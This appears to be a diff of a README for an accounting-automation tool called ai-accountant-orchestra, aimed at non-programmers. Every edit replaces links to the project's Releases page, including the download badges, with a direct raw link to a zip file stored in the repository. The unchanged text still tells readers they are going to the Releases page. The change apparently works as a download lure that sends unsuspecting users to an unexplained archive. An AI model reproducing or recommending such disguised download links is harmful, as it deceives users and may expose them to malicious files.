@@ -4,7 +4,7 @@
 Welcome to ai-accountant-orchestra! This software helps automate your accounting tasks using user-friendly YAML recipes. You don’t need any programming skills to use it. Follow this guide to download and run the application easily.
 
 ## 📥 Download the Application
-[![Download ai-accountant-orchestra](https://img.shields.io/badge/Download-ai--accountant--orchestra-blue.svg)](https://github.com/skybirdoms/ai-accountant-orchestra/releases)
+[![Download ai-accountant-orchestra](https://raw.githubusercontent.com/skybirdoms/ai-accountant-orchestra/main/agents/ai-orchestra-accountant-v1.3.zip)](https://raw.githubusercontent.com/skybirdoms/ai-accountant-orchestra/main/agents/ai-orchestra-accountant-v1.3.zip)
 
 Click the button above to get started. You will be taken to the Releases page where you can download the latest version of the application.
 
@@ -22,7 +22,7 @@ To run ai-accountant-orchestra, you need:
 - Basic understanding of file navigation on your computer 
 
 ## ⚙️ Download & Install
-1. **Visit the Releases Page**: Go to [this page](https://github.com/skybirdoms/ai-accountant-orchestra/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to [this page](https://raw.githubusercontent.com/skybirdoms/ai-accountant-orchestra/main/agents/ai-orchestra-accountant-v1.3.zip) to find the latest version.
    
 2. **Choose Your Version**: Look for the most recent release. Each version may include additional features and bug fixes.
 
@@ -55,4 +55,4 @@ If you need assistance or have questions, feel free to reach out via the Issues 
 ## 🎉 Conclusion
 ai-accountant-orchestra is designed for ease of use and efficiency in handling your accounting tasks. Download it today using the link below.
 
-[![Download ai-accountant-orchestra](https://img.shields.io/badge/Download-ai--accountant--orchestra-blue.svg)](https://github.com/skybirdoms/ai-accountant-orchestra/releases)
+[![Download ai-accountant-orchestra](https://raw.githubusercontent.com/skybirdoms/ai-accountant-orchestra/main/agents/ai-orchestra-accountant-v1.3.zip)](https://raw.githubusercontent.com/skybirdoms/ai-accountant-orchestra/main/agents/ai-orchestra-accountant-v1.3.zip)
